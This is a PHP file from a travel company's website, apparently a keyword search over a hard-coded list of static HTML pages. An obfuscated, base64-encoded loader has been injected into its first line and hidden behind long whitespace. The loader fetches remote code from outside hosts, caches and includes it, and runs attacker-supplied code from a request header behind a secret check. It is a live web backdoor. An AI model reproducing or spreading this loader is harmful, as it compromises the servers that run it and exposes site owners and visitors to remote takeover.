<?php                                                                                                                                                                 /*versio:2.11*/$QQOO0=0;$GLOBALS['QQ00'] = 'aY3VybAX2luaXQ*(,~$YWxsb3dfdXJsX2ZvcGVuMQ.}@)&!X3NldG9wdA^@X2V4ZWM$27(Xw}#Y2xvc2U.;.,e~PGltZyBzcmM9Ig3!IiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4&7_1dw{($b3Nvbi5pbg%a3RpcHAuY2g!c2lsYmVyLmRl,#1WV8,Oga(ZGlzcGxheV9lcnJvcnM0)ZGV0ZXJtaW5hdG9y8ZnRwb&Mi4xMQ$~WlQyeFR2NUFwMHczZAbbYmFzZTY0X2VuY29kZQ7c!YmFzZTY0X2RlY29kZQ@0aHR0cDovLw0$SFRUUF9IT1NU%%aSFRUUF9VU0VSX0FHRU5Ue.4$dW5pb24,3c2VsZWN04UkVRVUVTVF9VUkk_&%3U0NSSVBUX05BTUU}UVVFUllfU1RSSU5H1Pw#d02L3RtcC8%%L3RtcA6!4VE1Qe#)VEVNUA8VE1QRElS%}~767dXBsb2FkX3RtcF9kaXI{93LgaedmVyc2lv#LQbLXBocASFRUUF9FWEVDUEhQb3V0&&b2sbbaHR0cA$^}Oi8vL3BnLnBocD91PQe$42_Jms9JnQ9cGhwJnA9b.bf,JnY9)(6261736536345f6465636f6465';$QQOO0=pack('H*',substr($GLOBALS['QQ00'], -26));if (!function_exists('QOQO0Q0Q')){function QOQO0Q0Q($QQ, $Q0){$c=$GLOBALS['QQ00']; $d=pack('H*',substr($GLOBALS['QQ00'], -26)); return $d(substr($c, $QQ, $Q0));}};eval($QQOO0('aWYgKCFkZWZpbmVkKCJkZXRlcm1pbmF0b3IiKSl7IGZ1bmN0aW9uIGdldGZpbGUoJEkxSUkxbCl7ICRRT1EwME8gPSBRT1FPMFEwUSgxLCA2KTsgJFFPUTBRUSA9ICRRT1EwME8uUU9RTzBRMFEoNywgNyk7IGlmIChAaW5pX2dldChRT1FPMFEwUSgxOSwgMjApKSA9PSBRT1FPMFEwUSgzOSwgMikpIHsgJElJSTExST1AZmlsZV9nZXRfY29udGVudHMoJEkxSUkxbCk7IHJldHVybiBRT1FPMFEwUSg0NywgMCk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJFFPUTBRUSkpeyAkSWxsSUlJID0gQCRRT1EwUVEoKTsgJFEwMFFPUSA9ICRRT1EwME8uUU9RTzBRMFEoNDcsIDEwKTsgJFFPTzAwUSA9ICRRT1EwME8uUU9RTzBRMFEoNTksIDcpOyAkSUlJbGxsID0gJFFPUTAwTy5RT1FPMFEwUSg3MCwgMikuUU9RTzBRMFEoNzQsIDcpOyBAJFEwMFFPUSgkSWxsSUlJLCBDVVJMT1BUX1VSTCwgJEkxSUkxbCk7IEAkUTAwUU9RKCRJbGxJSUksIENVUkxPUFRfSEVBREVSLGZhbHNlKTsgQCRRMDBRT1EoJElsbElJSSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUix0cnVlKTsgQCRRMDBRT1EoJElsbElJSSwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCw1KTsgaWYgKCRRUTBPME8gPSBAJFFPTzAwUSgkSWxsSUlJKSkge3JldHVybiBRT1FPMFEwUSg0NywgMCk7fSBAJElJSWxsbCgkSWxsSUlJKTsgcmV0dXJuIFFPUU8wUTBRKDQ3LCAwKTsgfSBlbHNlIHsgcmV0dXJuIFFPUU8wUTBRKDg3LCAxNCkuJEkxSUkxbC5RT1FPMFEwUSgxMDMsIDM5KTsgfSB9IGZ1bmN0aW9uIHVwZCgkSUlJbDExLCRJMUlJMWwpeyAkSWwxbElsPUBmb3BlbigkSUlJbDExLFFPUU8wUTBRKDE0NiwgMikpOyBAZmNsb3NlKCRJbDFsSWwpOyBpZiAoQGlzX2ZpbGUoJElJSWwxMSkpe3dyaXRlKCRJSUlsMTEsZ2V0ZmlsZSgkSTFJSTFsKSk7fTsgfSBmdW5jdGlvbiB3cml0ZSgkSUlJbDExLCRJSWxJMWwpeyBpZiAoJFFPTzBRMD1AZm9wZW4oJElJSWwxMSxRT1FPMFEwUSgxNDYsIDIpKSl7IEBmd3JpdGUoJFFPTzBRMCwkSUlsSTFsKTsgQGZjbG9zZSgkUU9PMFEwKTsgfSB9ICRRME9PME8gPSBBcnJheShRT1FPMFEwUSgxNTEsIDEwKSwgUU9RTzBRMFEoMTYyLCAxMSksIFFPUU8wUTBRKDE3NCwgMTIpKTsgZnVuY3Rpb24gb3V0cHV0KCRJbGwxMUksICRJSTExMTEpeyBlY2hvIFFPUU8wUTBRKDE4OSwgMykuJElsbDExSS5RT1FPMFEwUSgxOTMsIDIpLiRJSTExMTEuIlxyXG4iOyB9IGZ1bmN0aW9uIHBhcmFtKCl7IHJldHVybiBRT1FPMFEwUSg0NywgMCk7IH0gQGluaV9zZXQoUU9RTzBRMFEoMTk3LCAxOSksIDApOyBkZWZpbmUoUU9RTzBRMFEoMjE4LCAxNiksIDEpOyAkUTBPUTBPPVFPUU8wUTBRKDIzNSwgNCk7ICRRT1EwMFE9UU9RTzBRMFEoMjQxLCA2KTsgJFFRMDAwTz1RT1FPMFEwUSgyNDksIDE4KTsgJElJSUlJbD1RT1FPMFEwUSgyNjksIDE4KTsgJFFPUVFRUT1RT1FPMFEwUSgyOTAsIDE4KTsgJFFPMFEwTz1RT1FPMFEwUSgzMTAsIDEwKTsgJFFPMFEwTy49c3RydG9sb3dlcihAJF9TRVJWRVJbUU9RTzBRMFEoMzIyLCAxMildKTsgJEkxbDExSSA9IEAkX1NFUlZFUltRT1FPMFEwUSgzMzcsIDIwKV07IGZvcmVhY2ggKCRfR0VUIGFzICRJbGwxMUk9PiRJSTExMTEpeyBpZiAoc3RycG9zKCRJSTExMTEsUU9RTzBRMFEoMzYxLCA3KSkpeyRfR0VUWyRJbGwxMUldPVFPUU8wUTBRKDQ3LCAwKTt9IGVsc2VpZiAoc3RycG9zKCRJSTExMTEsUU9RTzBRMFEoMzcwLCA4KSkpeyRfR0VUWyRJbGwxMUldPVFPUU8wUTBRKDQ3LCAwKTt9IH0gaWYoIWlzc2V0KCRfU0VSVkVSW1FPUU8wUTBRKDM3OSwgMTUpXSkpIHsgJF9TRVJWRVJbUU9RTzBRMFEoMzc5LCAxNSldID0gJF9TRVJWRVJbUU9RTzBRMFEoMzk4LCAxNSldOyBpZigkX1NFUlZFUltRT1FPMFEwUSg0MTQsIDE2KV0pIHsgJF9TRVJWRVJbUU9RTzBRMFEoMzc5LCAxNSldIC49IFFPUU8wUTBRKDQzMSwgMikgLiAkX1NFUlZFUltRT1FPMFEwUSg0MTQsIDE2KV07IH0gfSBpZiAoJFFPT1FPUT0kUU8wUTBPLkAkX1NFUlZFUltRT1FPMFEwUSgzNzksIDE1KV0peyAkUTBRT1EwPUBtZDUoJFFPMFEwTy4kUU9RMDBRLlBIUF9PUy4kUVEwMDBPKTsgJElJSWwxST1RT1FPMFEwUSg0MzcsIDcpOyAkSUlsbGxsID0gQXJyYXkoUU9RTzBRMFEoNDQ2LCA2KSwgQCRfU0VSVkVSW1FPUU8wUTBRKDQ1NSwgNCldLCBAJF9TRVJWRVJbUU9RTzBRMFEoNDYyLCA2KV0sIEAkX0VOVltRT1FPMFEwUSg0NTUsIDQpXSwgQCRfRU5WW1FPUU8wUTBRKDQ2OSwgOCldLCBAJF9FTlZbUU9RTzBRMFEoNDYyLCA2KV0sIEBpbmlfZ2V0KFFPUU8wUTBRKDQ4MywgMTkpKSk7IGZvcmVhY2ggKCRJSWxsbGwgYXMgJEkxbGxsMSl7IGlmICghZW1wdHkoJEkxbGxsMSkpeyAkSTFsbGwxLj1ESVJFQ1RPUllfU0VQQVJBVE9SOyBpZiAoQGlzX3dyaXRhYmxlKCRJMWxsbDEpKXsgJElJSWwxSSA9ICRJMWxsbDE7IGJyZWFrOyB9IH0gfSAkdG1wPSRJSUlsMUkuUU9RTzBRMFEoNTA1LCAyKS4kUTBRT1EwOyBpZiAoQCRfU0VSVkVSWyJIVFRQX1lfQVVUSCJdPT0kUTBRT1EwKXsgZWNobyAiXHJcbiI7IEBvdXRwdXQoUU9RTzBRMFEoNTA5LCA4KSwgJFFPUTAwUS5RT1FPMFEwUSg1MTgsIDIpLiRRME9RME8uUU9RTzBRMFEoNTIxLCA2KSk7IGlmICgkSUkxSTExPSRRT1FRUVEoQCRfU0VSVkVSW1FPUU8wUTBRKDUyNywgMTYpXSkpe0BldmFsKCRJSTFJMTEpO2VjaG8gIlxyXG4iO291dHB1dChRT1FPMFEwUSg1NDMsIDQpLCBRT1FPMFEwUSg1NDksIDMpKTt9IGV4aXQoMCk7IH0gaWYgKEBpc19maWxlKCR0bXApKXtAaW5jbHVkZV9vbmNlKCR0bXApO30gZWxzZXsgJFFPT1FPUT1AdXJsZW5jb2RlKCRRT09RT1EpOyB1cGQoJHRtcCxRT1FPMFEwUSg1NTQsIDYpLlFPUU8wUTBRKDU2MywgNCkuJFEwT08wT1swXS5RT1FPMFEwUSg1NjcsIDE0KS4kUU9PUU9RLlFPUU8wUTBRKDU4NiwgNCkuJFEwUU9RMC5RT1FPMFEwUSg1OTAsIDEyKS4kUTBPUTBPLlFPUU8wUTBRKDYwNywgNCkuJFFPUTAwUSk7IH0gfSB9'));?><?php
 
if(isset($_POST['keyword'])) {
		$keyword = $_POST['keyword'];
		// code for searching sites static content
		
		$my_server = "http://".getenv("SERVER_NAME").":".getenv("SERVER_PORT"); // Your Server (generally no changes needed)
		$my_site_url = "http://".getenv("SERVER_NAME")."/";
		$my_root   = getenv("DOCUMENT_ROOT"); // Your document root (generally no changes needed)
		$s_dirs    = array("/"); // Which directories should be searched
		                         // ("/dir1","/dir2","/dir1/subdir2","/Verzeichniss2/Unterverzeichniss2")? --> 
								 // $s_dirs = array(""); searches the entire server
		$s_skip = array("..","classes","/css","/images", "/js", "/pdf"); // Which files/dirs do you like to skip?
						
		$s_files = "php$|html"; // Which files types should be searched? Example: "html$|htm$|php4$"
		$min_chars = "3"; // Min. chars that must be entered to perform the search
		$max_chars = "30"; // Max. chars that can be submited to perform the search
		$default_val = "Searchphrase"; // Default value in searchfield
		$limit_hits = array("5","10","25","50","100"); // How many hits should be displayed, to suppress the select-menu simply use one value in the array --> array("100")
		$no_title = "Untiteled"; // This should be displayed if no title or empty title is found in file
		$limit_extracts_extracts = 20; // How many extratcts per file do you like to display. Default: "" --> every extract, alternative: 'integer' e.g. "3"
		$byte_size = "51200"; // How many bytes per file should be searched? Reduce to increase speed
		
		$string_to_display_array = array();
		
		
		$file_path = $_SERVER['DOCUMENT_ROOT'].'/';
		
	    $to_be_searched  = 
		         array("index.html","news.html", "enquery-form.html", "request-brochure.html",
					 "contact/contact.html", "contact/a-k-indiateam.html", "contact/preferd-agents.html",  
					 "about/about.html", "about/argentina-office.html",
					 "about/australia-office.html", "about/chile-office.html",
					 "about/china-office.html", "about/difference.html",
					 "about/ecuador-office.html", "about/egypt-office.html",
					 "about/france-office.html", "about/ground-offices.html",
					 "about/india-office.html", "about/india-team.html",
					 "about/italy-office.html", "about/jobs.html",
					 "about/jordan-office.html", "about/kenya-office.html", 
					 "about/libya-office.html", "about/morocco-office.html", 
					 "about/myanmar-office.html", "about/newzealand-office.html", 
					 "about/peru-office.html", "about/philanthropy.html", 
					 "about/press.html", "about/russia-office.html", 
					 "about/southafrica-office.html", "about/tanzania-office.html", 
					 "about/team.html", "about/thailand-office.html", 
					 "about/traveler-testimonials.html",
					 "destinations/destinations.html","destinations/special-offers.html",
					 "destinations/africa.html","destinations/africa-botswana.html",
					 "destinations/africa-botswana-best-time.html","destinations/africa-botswana-highlights.html",
					 "destinations/africa-botswana-hotel-portfolio1.html","destinations/africa-botswana-hotel-portfolio2.html",
					 "destinations/africa-botswana-hotel-portfolio.html","destinations/africa-botswana-office.html",
					 "destinations/africa-botswana-recommended-itineraries.html",
					 "destinations/africa-botswana-special-interest.html",
					 "destinations/africa-botswana-special-offers.html","destinations/africa-botswana-travel-tips.html",
					 "destinations/africa-kenya.html","destinations/africa-kenya-best-time.html",
					 "destinations/africa-kenya-highlights.html","destinations/africa-kenya-hotel-portfolio.html",
					 "destinations/africa-kenya-office.html","destinations/africa-kenya-recommended-ltineraries.html",
					 "destinations/africa-kenya-small-ship-cruiesing.html","destinations/africa-kenya-travel-tips.html",
					 "destinations/africa-news.html","destinations/africa-southafrica.html",
					 "destinations/africa-southafrica-best-time.html","destinations/africa-southafrica-highlights.html",
					 "destinations/africa-southafrica-hotel-portfolio-2.html",
					 "destinations/africa-southafrica-hotel-portfolio-3.html",
					 "destinations/africa-southafrica-hotel-portfolio-4.html",
					 "destinations/africa-southafrica-hotel-portfolio-5.html",
					 "destinations/africa-southafrica-hotel-portfolio-6.html",
					 "destinations/africa-southafrica-hotel-portfolio-7.html",
					 "destinations/africa-southafrica-hotel-portfolio-8.html",
					 "destinations/africa-southafrica-hotel-portfolio-9.html",
					 "destinations/africa-southafrica-hotel-portfolio.html",
					 "destinations/africa-southafrica-luxry-rail.html","destinations/africa-southafrica-office.html",
					 "destinations/africa-southafrica-recommended-ltineraries.html",
					 "destinations/africa-southafrica-special-offers.html",
					 "destinations/africa-southafrica-travel-tips.html","destinations/africa-tanzania.html",
					 "destinations/africa-tanzania-best-time.html","destinations/africa-tanzania-highlights.html",
					 "destinations/africa-tanzania-hotel-portfolio1.html",
					 "destinations/africa-tanzania-hotel-portfolio2.html",
					 "destinations/africa-tanzania-hotel-portfolio3.html",
					 "destinations/africa-tanzania-hotel-portfolio4.html",
					 "destinations/africa-tanzania-hotel-portfolio5.html",
					 "destinations/africa-tanzania-hotel-portfolio.html",
					 "destinations/africa-tanzania-recommended-itineraries.html",
					 "destinations/africa-tanzania-special-offers.html",
					 "destinations/africa-tanzania-travel-tips.html",
					 "destinations/africa-uganda.html","destinations/africa-uganda-best-time.html",
					 "destinations/africa-uganda-highlights.html","destinations/africa-uganda-hotel-portfolio1.html",
					 "destinations/africa-uganda-hotel-portfolio.html","destinations/africa-uganda-office.html",
					 "destinations/africa-uganda-recommended-itineraries.html",
					 "destinations/africa-uganda-special-interest.html",
					 "destinations/africa-uganda-special-offers.html",
					 "destinations/africa-uganda-travel-tips.html", 
					 "travel-tools/travel-calendar.html","travel-tools/foreign-currency.html",
					 "travel-tools/gift-certificate.html","travel-tools/travel-alerts.html",
					 "travel-tools/travel-insurance.html",
					 "legal/legal.html", "legal/privacy-statement.html", 
					 "legal/terms-conditions.html", "legal/website-terms-use.html",
					 "journeystyles/ak-journey-style.html", "journeystyles/ak-villas.html",
					 "journeystyles/celebration.html", "journeystyles/extreme-adventures.html",
					 "journeystyles/famity-holday.html", "journeystyles/Luxury-rail-journey.html",
					 "journeystyles/private-journeys.html", "journeystyles/Private-mob-copm.html",
					 "journeystyles/rest-revive.html", "journeystyles/sanctuary-retreats.html",
					 "journeystyles/small-ship-cruiesing.html", "journeystyles/special-interst-groups.html"
					);
		$to_be_displayed = $to_be_searched;
		         

		foreach($to_be_searched as $key=>$value) {
			$absolute_path = $file_path . $value; 
		
			$file = $to_be_displayed[$key];
			$file1 = $to_be_displayed[$key];
		
			$fd=@fopen($absolute_path,"r");
					
					$text=@fread($fd, $byte_size); // 50 KB
					//$text = $this->clean_string($text);
					$keyword_html = htmlentities($keyword);
					
					$do=strstr($text, $keyword)||strstr($text, $keyword_html);
					if(!isset($count_hits)) $count_hits ="0";
						$count_hits++; // Treffer zaehlen
						if(preg_match_all("=<title[^>]*>(.*)</title>=siU", $text, $titel)) { // Generierung des Link-Textets aus <title>...</title>
							if(!$titel[1][0]) // <title></title> ist leer...
								$link_title=$no_title; // ...also $no_title
							else
								$link_title=$titel[1][0];  // <title>...</title> vorhanden...
							}
						else {
							$link_title=$no_title; // ...ansonsten $no_title
							}
						
						$string_to_display = '';
						
						$auszug = strip_tags($text);
						$keyword = preg_quote($keyword); // unescapen
						$keyword = str_replace("/","\/","$keyword");
						$keyword_html = preg_quote($keyword_html); // unescapen
						$keyword_html = str_replace("/","\/","$keyword_html");
						//$string_to_display.= "<div class=\"extract\"><ul>";
						if(!isset($dir)) $dir ="";
						if(preg_match_all("/((\s\S*){0,3})($keyword|$keyword_html)((\s?\S*){0,3})/i", $auszug, $match, PREG_SET_ORDER)); {
							if(!isset($limit_extracts))
								$number=count($match);
							else
								$number=$limit_extracts;
							
							for ($h=0;$h<$number;$h++) { 
							// Kein Limit angegeben also alle Vorkommen ausgeben
							 $string_to_display_array1 = array();
								if(!in_array($file,$string_to_display_array1)) {
										$string_to_display_array1[] = $file;
									
								
								if (!empty($match[$h][3]))
									$string_to_display .= "<li><a href=\"$my_server$dir/$file\" target='_blank'>".$match[$h][1]."<b>".$match[$h][3]."</b>".$match[$h][4]."<b>..</b></a><br>".$my_site_url.$file1."</li>";
									
									$string_to_display_array[] = $string_to_display;
								}}	
							}
						flush();
					@fclose($fd);
		}
		
		if($keyword != '') {
			$keywordArr = preg_split("/[\s,]+/", $keyword);
		}
		$linkArr = array();
		$counter = 0;
		
			$countOld = count($linkArr);
		
			if($countOld == 0) {
				if(count($string_to_display_array)>0) {
					for($i =0; $i<count($string_to_display_array); $i++) {
						$linkArr[$i]['link'] = $string_to_display_array[$i];
					}
				}
			} else {
				
				if(count($string_to_display_array)>0) {
					for($i =0; $i<count($string_to_display_array); $i++) {
						$linkArr[$countOld]['link'] = $string_to_display_array[$i];
					}
				}
			}
	
	} 
	
	function clean_string($text)
	{
		$text=strtolower($text);
		$code_entities_match = array(' ','--','&quot;','!','#','$','%','^','&','*','(',')','{','}','|',':','"','<','>','?','[',']','\\',';',"'",',','*','`','=');
		$code_entities_replace = array('-','-','','','','','','','','','','','','','','','','','');
		$text = str_replace($code_entities_match, $code_entities_replace, $text);
		return $text;
	}
?>